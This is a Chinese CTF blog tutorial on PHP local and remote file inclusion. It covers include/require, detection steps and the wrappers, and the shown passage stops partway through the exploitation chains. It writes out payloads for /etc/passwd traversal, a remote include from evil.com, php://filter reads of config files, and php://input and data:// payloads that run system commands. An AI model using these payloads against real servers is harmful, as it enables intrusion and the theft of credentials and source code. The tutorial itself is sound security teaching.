@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.css" integrity="sha256-mdaMxrItEW6hMIVJJNPKuX0B7KCSJQVEv3mVY4N2we4=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"quellisya.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="文件包含题的通用知识：include 和 require 的区别、怎么判断 LFI、php:&#x2F;&#x2F;filter 读源码、常见伪协议、日志包含&#x2F;图片马&#x2F;zip 包含等利用链，附流程速查和防护建议。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含基础：include、伪协议与 LFI 利用链">
+<meta property="og:url" content="https://quellisya.github.io/2026/10/30/web-knowledge-file-inclusion-basics/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="文件包含题的通用知识：include 和 require 的区别、怎么判断 LFI、php:&#x2F;&#x2F;filter 读源码、常见伪协议、日志包含&#x2F;图片马&#x2F;zip 包含等利用链，附流程速查和防护建议。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-10-30T00:30:00.000Z">
+<meta property="article:modified_time" content="2026-10-30T00:30:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="php:&#x2F;&#x2F;filter">
+<meta property="article:tag" content="伪协议">
+<meta property="article:tag" content="入门基础">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://quellisya.github.io/2026/10/30/web-knowledge-file-inclusion-basics/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/30/web-knowledge-file-inclusion-basics/","path":"/2026/10/30/web-knowledge-file-inclusion-basics/","title":"文件包含基础：include、伪协议与 LFI 利用链"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件包含基础：include、伪协议与 LFI 利用链 | Quellisya's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.umd.js" integrity="sha256-QnJV4HT5r8i89ovZGRD86iynZqHerEbT2xt69vDM36I=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.1/pangu.umd.js" integrity="sha256-kRsxecBnwG6mULFPe2E6UKnNm8XfDOuDwCOprjLZuX8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","display_overflow":"scroll","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-mml-chtml.js","integrity":"sha256-ihPtDDm7pTmSF9ViEsItlvsrBTsNkz0MOXMchzOwCQw="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Quellisya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF · Web Security · Writeups</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E6%9C%89%E6%B2%A1%E6%9C%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.</span> <span class="nav-text">怎么判断有没有文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E6%BA%90%E7%A0%81%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">读源码，而不是执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%BC%AA%E5%8D%8F%E8%AE%AE%E9%80%9F%E6%9F%A5"><span class="nav-number">4.</span> <span class="nav-text">常见伪协议速查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">5.</span> <span class="nav-text">常见利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%AF%BB%E6%BA%90%E7%A0%81%E6%89%BE-flag-%E9%85%8D%E7%BD%AE"><span class="nav-number">5.1.</span> <span class="nav-text">1. 读源码找 flag &#x2F; 配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-php-input-%E6%89%A7%E8%A1%8C-POST-%E4%BB%A3%E7%A0%81"><span class="nav-number">5.2.</span> <span class="nav-text">2. php:&#x2F;&#x2F;input 执行 POST 代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-data-%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="nav-number">5.3.</span> <span class="nav-text">3. data:&#x2F;&#x2F; 执行代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">5.4.</span> <span class="nav-text">4. 日志包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%9B%BE%E7%89%87%E9%A9%AC-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">5.5.</span> <span class="nav-text">5. 图片马 + 文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-zip-phar"><span class="nav-number">5.6.</span> <span class="nav-text">6. zip:&#x2F;&#x2F; &#x2F; phar:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">5.7.</span> <span class="nav-text">7. Session 文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E9%80%9F%E6%9F%A5"><span class="nav-number">6.</span> <span class="nav-text">绕过技巧速查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5"><span class="nav-number">7.</span> <span class="nav-text">完整流程速查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-number">8.</span> <span class="nav-text">新手常见问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="nav-number">9.</span> <span class="nav-text">顺手聊聊怎么防</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Quellisya</p>
+  <div class="site-description" itemprop="description">记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://quellisya.github.io/2026/10/30/web-knowledge-file-inclusion-basics/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Quellisya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Quellisya's Blog">
+      <meta itemprop="description" content="记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件包含基础：include、伪协议与 LFI 利用链 | Quellisya's Blog">
+      <meta itemprop="description" content="文件包含题的通用知识：include 和 require 的区别、怎么判断 LFI、php:&#x2F;&#x2F;filter 读源码、常见伪协议、日志包含&#x2F;图片马&#x2F;zip 包含等利用链，附流程速查和防护建议。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含基础：include、伪协议与 LFI 利用链
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-10-30 08:30:00" itemprop="dateCreated datePublished" datetime="2026-10-30T08:30:00+08:00">2026-10-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/file-inclusion/" itemprop="url" rel="index"><span itemprop="name">文件包含</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">文件包含题的通用知识：include 和 require 的区别、怎么判断 LFI、php://filter 读源码、常见伪协议、日志包含/图片马/zip 包含等利用链，附流程速查和防护建议。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fa fa-layer-group"></i>
+    <span class="series-nav__name">系列：文件包含</span>
+    <span class="series-nav__count">第 1 / 2 篇</span>
+  </div>
+  <ol class="series-nav__list"><li class="is-current"><a href="&#x2F;2026&#x2F;10&#x2F;30&#x2F;web-knowledge-file-inclusion-basics&#x2F;">文件包含基础：include、伪协议与 LFI 利用链</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;30&#x2F;web-ctf-file-inclusion-secret-file&#x2F;">[极客大挑战 2019] Secret File：源码注释、302 跳转与 php:&#x2F;&#x2F;filter</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__next" href="&#x2F;2026&#x2F;10&#x2F;30&#x2F;web-ctf-file-inclusion-secret-file&#x2F;">[极客大挑战 2019] Secret File：源码注释、302 跳转与 php:&#x2F;&#x2F;filter<i class="fa fa-arrow-right"></i></a></div>
+</nav><div class="note primary"><p><strong>一分钟速览</strong></p>
+<ul>
+<li><strong>难度</strong>：入门</li>
+<li><strong>考点</strong>：本地文件包含（LFI）、<code>php://filter</code>、伪协议、日志包含、图片马</li>
+<li><strong>一句话原理</strong>：<code>include($_GET[&#39;file&#39;])</code> 把用户输入当文件名，用户就能让 PHP 去读&#x2F;执行任意文件</li>
+<li><strong>最常用的 payload</strong>：<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></li>
+</ul>
+</div>
+
+<div class="note info"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>前置知识</strong>：PHP 基础、HTTP GET 参数、知道 <code>include</code> 是干什么的</li>
+<li><strong>工具</strong>：浏览器、Burp Suite &#x2F; <code>curl</code>、CyberChef</li>
+<li><strong>配套实战</strong>：[极客大挑战 2019] Secret File 的完整 writeup 在<a href="/2026/10/30/web-ctf-file-inclusion-secret-file/">这里</a></li>
+<li>本文所有测试仅用于<strong>授权靶场和本地环境</strong>。</li>
+</ul>
+</div>
+
+<div class="note default"><p><strong>做题路线</strong></p>
+<p><code>找参数</code> → <code>判断是否包含</code> → <code>试目录穿越</code> → <code>读源码（php://filter）</code> → <code>找可利用文件</code> → <code>日志/图片马/zip 包含</code> → <code>拿 flag</code></p>
+</div>
+
+<h2 id="文件包含漏洞是什么"><a href="#文件包含漏洞是什么" class="headerlink" title="文件包含漏洞是什么"></a>文件包含漏洞是什么</h2><p>PHP 有几个“把文件当代码执行”的函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;header.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;functions.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;functions.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>include</code> 和 <code>require</code> 的区别只有一个：<strong>文件不存在时</strong>，<code>include</code> 发 warning 继续执行，<code>require</code> 直接 fatal error 停止。做题时都可能遇到。</p>
+<p>漏洞出在<strong>文件名来自用户输入</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+<p>正常访问 <code>?page=about.php</code> 会包含 <code>about.php</code>；但如果用户传：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><code>include</code> 就会去读 <code>/etc/passwd</code>。如果服务器还允许远程包含，甚至可以：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=http://evil.com/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>这就是<strong>文件包含漏洞</strong>。按包含的文件位置，分为：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>英文</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>本地文件包含</td>
+<td>LFI（Local File Inclusion）</td>
+<td>包含服务器本地的文件</td>
+</tr>
+<tr>
+<td>远程文件包含</td>
+<td>RFI（Remote File Inclusion）</td>
+<td>包含远程 URL 上的文件，需要 <code>allow_url_include=On</code></td>
+</tr>
+</tbody></table>
+<p>CTF 里绝大多数是 <strong>LFI</strong>，因为 RFI 默认关闭。</p>
+<h2 id="怎么判断有没有文件包含"><a href="#怎么判断有没有文件包含" class="headerlink" title="怎么判断有没有文件包含"></a>怎么判断有没有文件包含</h2><p>先找“像文件名”的参数：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?page=</span><br><span class="line">?file=</span><br><span class="line">?path=</span><br><span class="line">?template=</span><br><span class="line">?include=</span><br><span class="line">?require=</span><br><span class="line">?view=</span><br><span class="line">?module=</span><br></pre></td></tr></table></figure>
+
+<p>然后做几个测试：</p>
+<table>
+<thead>
+<tr>
+<th>测试</th>
+<th>预期</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>?page=about.php</code></td>
+<td>正常</td>
+<td>确认参数确实当文件名用</td>
+</tr>
+<tr>
+<td><code>?page=about</code></td>
+<td>可能正常</td>
+<td>后端可能自动补 <code>.php</code></td>
+</tr>
+<tr>
+<td><code>?page=../../../../etc/passwd</code></td>
+<td>回显 passwd</td>
+<td>目录穿越成功</td>
+</tr>
+<tr>
+<td><code>?page=php://filter/convert.base64-encode/resource=index.php</code></td>
+<td>回显 base64</td>
+<td>伪协议可用</td>
+</tr>
+<tr>
+<td><code>?page=/etc/passwd</code></td>
+<td>可能回显</td>
+<td>绝对路径</td>
+</tr>
+</tbody></table>
+<div class="note warning"><p>不要只凭“报错”判断。很多题 <code>error_reporting(0)</code>，包含失败也不报错。真正的判断标准是：<strong>页面内容有没有变化</strong>。可以先用一个肯定存在的文件（如 <code>index.php</code>）做对照。</p>
+</div>
+
+<h2 id="读源码，而不是执行"><a href="#读源码，而不是执行" class="headerlink" title="读源码，而不是执行"></a>读源码，而不是执行</h2><p>这是新手最容易混淆的点：</p>
+<ul>
+<li><code>include(&#39;flag.php&#39;)</code> 是<strong>执行</strong> <code>flag.php</code>；</li>
+<li>如果 <code>flag.php</code> 里只有 <code>$flag = &#39;...&#39;</code>，没有 <code>echo</code>，你什么都看不到；</li>
+<li>想要看源码，就要用 <code>php://filter</code> 在读取时先编码，让 <code>include</code> 拿到的是文本而不是 PHP 代码。</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>流程：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">include 打开 php://filter 流</span><br><span class="line">        ↓</span><br><span class="line">读取 flag.php 的原始字节</span><br><span class="line">        ↓</span><br><span class="line">convert.base64-encode 编码</span><br><span class="line">        ↓</span><br><span class="line">include 拿到 base64 文本（没有 &lt;?php）</span><br><span class="line">        ↓</span><br><span class="line">直接输出，不执行</span><br></pre></td></tr></table></figure>
+
+<p>拿到 base64 后，用 CyberChef 的 <code>From Base64</code> 或 <code>base64 -d</code> 解码，就能看到源码。</p>
+<div class="note success"><p><strong>一句话记</strong>：<code>include</code> 会执行，<code>php://filter</code> 让它“只读不执行”。读源码找 flag、找数据库密码、找 include 链，都靠它。</p>
+</div>
+
+<h2 id="常见伪协议速查"><a href="#常见伪协议速查" class="headerlink" title="常见伪协议速查"></a>常见伪协议速查</h2><p>PHP 的流包装器（wrapper）很多，CTF 常考这些：</p>
+<table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>用途</th>
+<th>前提&#x2F;说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>file://</code></td>
+<td>读本地文件</td>
+<td><code>file:///etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>php://filter</code></td>
+<td>读源码、编码&#x2F;解码</td>
+<td>最常用，不需要特殊配置</td>
+</tr>
+<tr>
+<td><code>php://input</code></td>
+<td>读 POST 原始数据</td>
+<td>需要 <code>allow_url_include=On</code></td>
+</tr>
+<tr>
+<td><code>data://</code></td>
+<td>直接把数据当文件</td>
+<td>需要 <code>allow_url_include=On</code></td>
+</tr>
+<tr>
+<td><code>zip://</code></td>
+<td>读 zip 内的文件</td>
+<td>需要上传 zip，<code>zip://path#file</code></td>
+</tr>
+<tr>
+<td><code>phar://</code></td>
+<td>读 phar 包，可触发反序列化</td>
+<td>需要上传 phar 文件</td>
+</tr>
+<tr>
+<td><code>http://</code> &#x2F; <code>https://</code></td>
+<td>远程包含</td>
+<td>需要 <code>allow_url_include=On</code></td>
+</tr>
+<tr>
+<td><code>ftp://</code></td>
+<td>远程包含</td>
+<td>需要 <code>allow_url_include=On</code></td>
+</tr>
+</tbody></table>
+<p>查看配置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();  <span class="comment">// 搜索 allow_url_include、allow_url_fopen、open_basedir</span></span><br></pre></td></tr></table></figure>
+
+<p>或者在命令行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep allow_url_include</span><br></pre></td></tr></table></figure>
+
+<div class="note warning"><p>不同 PHP 版本对伪协议的限制不同。比如 <code>data://</code> 在较新版本默认需要 <code>allow_url_include=On</code>；<code>phar://</code> 在 PHP 8 之后对反序列化的限制也更多。做题时以目标环境的 <code>phpinfo</code> 为准。</p>
+</div>
+
+<h2 id="常见利用链"><a href="#常见利用链" class="headerlink" title="常见利用链"></a>常见利用链</h2><h3 id="1-读源码找-flag-配置"><a href="#1-读源码找-flag-配置" class="headerlink" title="1. 读源码找 flag &#x2F; 配置"></a>1. 读源码找 flag &#x2F; 配置</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=config.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>先读入口文件，看它 <code>include</code> 了哪些文件；再顺着读 <code>config.php</code>、<code>flag.php</code>。这是最稳、最常见的路线。</p>
+<h3 id="2-php-input-执行-POST-代码"><a href="#2-php-input-执行-POST-代码" class="headerlink" title="2. php://input 执行 POST 代码"></a>2. <code>php://input</code> 执行 POST 代码</h3><p>如果 <code>allow_url_include=On</code>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><code>php://input</code> 把 POST body 当成文件内容，<code>include</code> 会执行里面的 PHP。</p>
+<h3 id="3-data-执行代码"><a href="#3-data-执行代码" class="headerlink" title="3. data:// 执行代码"></a>3. <code>data://</code> 执行代码</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;id&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者 base64 形式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+</span><br></pre></td></tr></table></figure>
+
+<p>同样需要 <code>allow_url_include=On</code>。</p>
